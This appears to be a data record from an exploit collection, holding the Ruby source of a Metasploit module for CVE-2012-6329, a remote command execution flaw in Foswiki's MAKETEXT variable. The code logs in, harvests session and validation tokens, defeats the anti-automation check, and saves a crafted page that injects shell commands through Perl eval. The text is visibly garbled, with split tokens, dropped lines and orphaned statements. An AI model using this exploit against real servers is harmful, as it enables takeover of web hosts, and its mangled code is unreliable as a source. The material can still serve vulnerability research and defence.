{
    "text": "vul_name : Foswiki MAKETEXT Remote Command Execution Exploit ， vul_cve : CVE-2012-6329 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'Foswiki MAKETEXT Remote Command Execution' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in the MAKETEXT Foswiki variable. By using ， a specially crafted MAKETEXT , a malicious user can execute shell commands since the ， input is passed to the Perl \"eval\" command without first being sanitized. The ， problem is caused by an underlying security issue in the CPAN : Locale : Maketext ， module. Only Foswiki sites that have user interface localization enabled ，  ( UserInterfaceInternationalisation variable set ) are vulnerable. ， If USERNAME and PASSWORD aren't provided , anonymous access will be tried. ， Also , if the FoswikiPage option isn't provided , the module will try to create a ， random page on the SandBox space. The modules has been tested successfully on ， Foswiki 1.1.5 as distributed with the official Foswiki-1.1.5-vmware image. ， } ,  ， 'Author' => ，  [  ， 'Brian Carlson' ,  # original discovery in Perl Locale : Maketext ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2012-6329' ]  ,  ，  [ 'OSVDB' , '88410' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Privileged' => false ,  # web server context ， 'Payload' => ， { ， 'DisableNops' => true ,  ， 'Space' => 1024 ,  ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ,  ， 'RequiredCmd' => 'generic ruby python bash telnet' ， } ， } ,  ， 'Platform' => [ 'unix' ]  ,  ， 'Arch' => ARCH_CMD ,  ， 'Targets' => [ 'Foswiki 1.1.5' , { } ]  ,  ， 'DisclosureDate' => 'Dec 03 2012' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , \"Foswiki base path\" , \"/\" ]  )  ,  ， OptString.new ( 'FoswikiPage' ,  [ false , \"Foswiki Page with edit permissions to inject the payload , by default random Page on Sandbox ( Ex : /Sandbox/MsfTest ) \" ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ false , \"The user to authenticate as ( anonymous if username not provided ) \" ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ false , \"The password to authenticate with ( anonymous if password not provided ) \" ]  )  ，  ]  , self.class )  ， end ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => \" # { @ base}bin/login\" ,  ， 'vars_post' => ， { ， 'username' => username ,  ， 'password' => password ， } ， } )  ， vprint_status \" # {res.code}\\n # {res.body}\" ， end ， session = $ 1 ， end ， vprint_status ( \"Retrieving the validation_key.\" )  ， res = send_request_cgi ( { ， 'uri' => \" # { @ base}bin/edit # { @ page}\" ,  ， 'cookie' => \"FOSWIKISID= # {session}\" ， } )  ， vprint_error ( \"Error retrieving the validation_key\" )  ， end ， validation_key = $ 1 ， vprint_good ( \"validation_key found :  # {validation_key}\" )  ， session = $ 1 ， vprint_error ( \"Error using anonymous access\" )  ， end ， end ， strike_one = $ 1 ， vprint_error ( \"Error getting the FOSWIKISTRIKEONE value\" )  ， end ，  # Transforming validation_key in order to bypass foswiki antiautomation ， validation_key = Rex : Text.md5 ( validation_key + strike_one )  ， vprint_status ( \"Transformed validation key :  # {validation_key}\" )  ， vprint_status ( \"Injecting the payload.\" )  ， res = send_request_cgi ( { ， 'method' => 'POST' ,  ， 'uri' => \" # { @ base}bin/save # { @ page}\" ,  ， 'cookie' => \"FOSWIKISID= # {session}\" ,  ， 'vars_post' => ， { ， 'validation_key' => validation_key ,  ， 'text' => \" # {rand_text_alpha ( 3 + rand ( 3 ) } %MAKETEXT{\\\" # {rand_text_alpha ( 3 + rand ( 3 ) } [ _1 ]  # {rand_text_alpha ( 3 + rand ( 3 ) }\\'} ; ` # {code}` ; { # \\\" args=\\\" # {rand_text_alpha ( 3 + rand ( 3 ) }\\\"}%\" ， } ， } )  ， print_warning ( \"Error injecting the payload\" )  ， print_status \" # {res.code}\\n # {res.body}\\n # {res.headers [ 'Location' ] }\" ， end ， location = URI ( res.headers [ 'Location' ]  ) .path ， print_good ( \"Payload injected on # {location}\" )  ， end ， def check ，  @ base = target_uri.path ，  @ base '/' if @ base [ -1 , 1 ]  ! = '/' ， res = send_request_cgi ( { ， 'uri' => \" # { @ base}System/WebHome\" ， } ) ",
    "time": "2012.12.24"
}